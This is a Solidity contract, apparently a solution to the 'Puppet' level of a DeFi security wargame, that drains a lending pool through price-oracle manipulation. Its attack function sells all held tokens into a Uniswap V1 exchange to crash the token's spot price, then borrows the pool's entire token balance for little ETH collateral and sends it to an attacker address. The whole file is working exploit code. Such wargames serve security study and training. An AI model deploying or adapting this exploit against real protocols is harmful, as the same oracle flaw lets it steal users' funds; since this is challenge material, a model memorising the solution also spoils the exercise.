// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Uniswap_ {
    function tokenToEthSwapInput(
        uint256 tokensSold,
        uint256 minEth,
        uint256 deadline
    ) external returns (uint256);

    function ethToTokenSwapInput(uint256 minTokens, uint256 deadline)
        external
        payable
        returns (uint256);
}

interface Token_ {
    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
}

interface PuppetPool_ {
    function borrow(uint256 amount, address recipient) external payable;

    function calculateDepositRequired(uint256 amount)
        external
        view
        returns (uint256);
}

contract PuppetAttacker {
    Uniswap_ uniswap;
    Token_ token;
    PuppetPool_ pool;
    address attacker;

    constructor(
        address _uniswap,
        address _token,
        address _pool,
        address _attacker
    ) payable {
        uniswap = Uniswap_(_uniswap);
        token = Token_(_token);
        pool = PuppetPool_(_pool);
        attacker = _attacker;
    }

    function attack() external payable {
        uint256 bal = token.balanceOf(address(this));
        token.approve(address(uniswap), bal);
        uniswap.tokenToEthSwapInput(bal, 1, block.timestamp * 2);

        uint256 poolBalance = token.balanceOf(address(pool));
        pool.borrow{value: msg.value}(poolBalance, attacker);
    }

    receive() external payable {}
}
